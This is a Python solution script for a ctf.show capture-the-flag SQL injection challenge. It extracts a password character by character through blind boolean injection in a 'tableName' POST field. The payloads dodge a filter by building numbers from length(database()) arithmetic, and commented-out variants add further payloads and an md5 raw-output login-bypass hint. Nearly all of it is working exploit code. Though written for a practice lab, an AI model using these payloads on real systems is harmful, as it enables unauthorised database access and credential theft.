import requests

flag = ""
for i in range(len(flag) + 1, 50):
    llll = len(flag)
    for s in "0123456789-abcdefgl{}":
        # {'tableName':"`ctfshow_user`where`id`>21&&!(mid(pass,%s,1)<>'%s')"%(i,s)} // user_count = 1;
        # {'tableName':"ctfshow_user a join ctfshow_user b on !(a.id<>b.id) ^ !(mid(a.pass,%s,1)<>char(%s))"%(i,ord(s))} //user_count = 42; 或可 ASCII
        # {'tableName':"ctfshow_user a join ctfshow_user b on !(a.id<>b.id) ^ !(mid(a.pass,%s,length(database())/length(database()))<>char(%s))"%((i*'+length(database())/length(database())')[1:],(ord(s)*'+length(database())/length(database())')[1:])} //user_count = 42;
        # {'tableName':"ctfshow_user a join ctfshow_user b on ascii(mid(a.pass,%s,length(database())/length(database())))-(%s)"%((i*'+length(database())/length(database())')[1:],(ord(s)*'+length(database())/length(database())')[1:])} // "user_count = 484;" not in
        # md5($_POST['password'],true); admin/e58
        # username/0 或者 1||1
        r = requests.post("http://0f848da3-76b8-42cd-b915-5687b130b4e9.chall.ctf.show/select-waf.php", data={
            'tableName': "ctfshow_user a join ctfshow_user b on ascii(mid(a.pass,%s,length(database())/length(database())))-(%s)" % (
            (i * '+length(database())/length(database())')[1:],
            (ord(s) * '+length(database())/length(database())')[1:])})
        data = {'tableName': "ctfshow_user a join ctfshow_user b on ascii(mid(a.pass,%s,length(database())/length(database())))-(%s)" % (
            (i * '+length(database())/length(database())')[1:],
            (ord(s) * '+length(database())/length(database())')[1:])}
        t = r.text
        # print(t)
        if "user_count = 484;" not in t:
            flag += s
            print(data)
            print(flag)
            break
    # break
    if "}" in flag or llll == len(flag):
        break
